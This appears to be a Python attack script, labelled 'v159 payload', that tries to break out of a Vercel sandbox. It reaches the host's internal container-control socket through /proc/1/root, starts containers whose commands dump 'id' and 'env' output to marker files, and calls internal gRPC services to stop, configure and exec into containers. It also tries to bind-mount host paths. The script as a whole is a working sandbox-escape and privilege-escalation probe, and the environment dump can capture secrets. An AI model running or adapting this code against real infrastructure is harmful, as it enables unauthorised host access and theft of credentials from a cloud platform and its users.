# -*- coding: utf-8 -*-
"""v159 payload: command 正确格式行为测试 + gRPC CelldService/Exec/StreamOutput
输出 /vercel/sandbox/v159c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v159c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        gs = re.search(rb'grpc-status: (\d+)', d)
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b'', gs.group(1).decode() if gs else ''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b'', ''


def raw_grpc(sockpath, path, msg, t=5.0):
    """原生 gRPC 调用: 5字节帧头 + protobuf 消息"""
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        body = b'\x00' + struct.pack('>I', len(msg)) + msg
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
               'TE: trailers\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        gs = re.search(rb'grpc-status: (\d+)', d)
        gm = re.search(rb'grpc-message: ([^\r\n]+)', d)
        return st, d[hdr_end + 4:hdr_end + 4 + 800] if hdr_end > 0 else b'', \
            gs.group(1).decode() if gs else '', gm.group(1).decode(errors='replace') if gm else ''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b'', '', ''


def fstr(field_no, s):
    return bytes([field_no << 3 | 2]) + bytes([len(s)]) + s.encode()


def fmsg(field_no, inner):
    return bytes([field_no << 3 | 2]) + bytes([len(inner)]) + inner


def fvarint(field_no, v):
    out = bytes([field_no << 3])
    while v >= 128:
        out += bytes([(v & 127) | 128])
        v >>= 7
    return out + bytes([v])


def check_marker(tag):
    res = []
    for p in ['/tmp/v159pwn', '/tmp/v159id', '/tmp/v159env', '/vercel/sandbox/v159pwn']:
        try:
            d = open(p).read()
            res.append('%s=%r' % (p, d[:200]))
        except Exception as e:
            res.append('%s=ERR' % p)
    log('%s markers: %s' % (tag, '; '.join(res)))


def list_procs():
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm not in ('celld', 'containerd', 'sandboxctrl', 'sandbox-init', 'runc', 'sh', 'bash'):
                continue
            try:
                cmdline = open('/proc/%s/cmdline' % d).read()[:120].replace('\x00', ' ')
            except Exception:
                cmdline = '?'
            log('proc %s comm=%s cmd=%s' % (d, comm, cmdline))


# ============ 1: Create command 正确格式 (string) ============
log('=== 1 create cmd string ===')
CMDS = [
    'echo V159PWN > /tmp/v159pwn; id > /tmp/v159id; env > /tmp/v159env',
    '/bin/sh -c "echo V159PWN > /tmp/v159pwn; id > /tmp/v159id; env > /tmp/v159env"',
]
for ci, c in enumerate(CMDS):
    body = json.dumps({'drive_id': 'sandbox', 'command': c}).encode()
    st, pay, gs = raw_req(CELL, '%s/Create' % CTRS, body, t=8)
    log('Create#%d cmd=%r -> %s %r gs=%s' % (ci, c[:60], st, pay[:400], gs))
    m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
    if m:
        cid = m.group(1).decode()
        log('cid=%s' % cid)
        st2, pay2, gs2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
        log('Start#%d -> %s %r gs=%s' % (ci, st2, pay2[:300], gs2))
        time.sleep(2)
        check_marker('after cmd#%d' % ci)
        list_procs()

# 带 environment (repeated string)
body = json.dumps({'drive_id': 'sandbox', 'command': 'echo V159PWN > /tmp/v159pwn; id > /tmp/v159id; env > /tmp/v159env',
                   'environment': ['V159ENV=HELLO159']}).encode()
st, pay, gs = raw_req(CELL, '%s/Create' % CTRS, body, t=8)
log('Create+env -> %s %r gs=%s' % (st, pay[:400], gs))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
if m:
    cid = m.group(1).decode()
    st2, pay2, gs2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start+env -> %s %r gs=%s' % (st2, pay2[:300], gs2))
    time.sleep(2)
    check_marker('after env')

# ============ 2: gRPC CelldService ============
log('=== 2 grpc celld ===')
CELD = '/vercel.hive.celld.api.v1.CelldService'
# GetDriveStorageUsage: 空消息
st, pay, gs, gm = raw_grpc(CELL, '%s/GetDriveStorageUsage' % CELD, b'')
log('grpc GetDriveStorageUsage -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))
# Heartbeat: 空消息
st, pay, gs, gm = raw_grpc(CELL, '%s/Heartbeat' % CELD, b'')
log('grpc Heartbeat -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))
# StopContainer: {container_id}
cid_test = '1e08bd49-7036-44de-88b0-027930db495f'
st, pay, gs, gm = raw_grpc(CELL, '%s/StopContainer' % CELD, fstr(1, cid_test))
log('grpc StopContainer -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))
# WaitContainer: 空
st, pay, gs, gm = raw_grpc(CELL, '%s/WaitContainer' % CELD, b'')
log('grpc WaitContainer -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))
# Configure: 空
st, pay, gs, gm = raw_grpc(CELL, '%s/Configure' % CELD, b'')
log('grpc Configure -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))
# SetWorkload: 空
st, pay, gs, gm = raw_grpc(CELL, '%s/SetWorkload' % CELD, b'')
log('grpc SetWorkload -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))
# StartContainer: {container_id}
st, pay, gs, gm = raw_grpc(CELL, '%s/StartContainer' % CELD, fstr(1, cid_test))
log('grpc StartContainer -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))

# ============ 3: gRPC containers Exec/StreamOutput ============
log('=== 3 grpc exec ===')
# 先 Create 一个容器
body = json.dumps({'drive_id': 'sandbox', 'command': 'sleep 300'}).encode()
st, pay, gs = raw_req(CELL, '%s/Create' % CTRS, body, t=8)
log('Create sleep300 -> %s %r' % (st, pay[:300]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    st2, pay2, gs2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start sleep300 -> %s %r' % (st2, pay2[:300]))
    # Exec: {container_id, process{command, arguments}}
    proc = fstr(1, '/bin/sh') + fmsg(2, fstr(1, '-c') + fstr(2, 'id > /tmp/v159exec; env >> /tmp/v159exec'))
    req = fstr(1, cid) + fmsg(2, proc)
    st, pay, gs, gm = raw_grpc(CELL, '%s/Exec' % CTRS, req, t=8)
    log('grpc Exec -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))
    time.sleep(1)
    check_marker('after grpc exec')
    # StreamOutput: {container_id, stream}
    req = fstr(1, cid) + fvarint(2, 0)
    st, pay, gs, gm = raw_grpc(CELL, '%s/StreamOutput' % CTRS, req, t=6)
    log('grpc StreamOutput -> %s gs=%s gm=%s %r' % (st, gs, gm, pay[:400]))

# ============ 4: Mount 带正确格式 ============
log('=== 4 mount ===')
if cid:
    # MountTypeBind: source/destination/mode (MountMode 枚举)
    # 猜测 JSON: {"container_id":cid,"mounts":[{"bind":{"source":"/tmp","destination":"/mnt/x","mode":"MODE_..."}}]}
    for mounts in [[{'bind': {'source': '/tmp', 'destination': '/mnt/x'}}],
                   [{'source': '/tmp', 'destination': '/mnt/x'}]]:
        st, pay, gs = raw_req(CELL, '%s/Mount' % CTRS,
                              json.dumps({'container_id': cid, 'mounts': mounts}).encode(), t=5)
        log('Mount %r -> %s %r gs=%s' % (mounts, st, pay[:300], gs))

log('V159_DONE')
f.close()
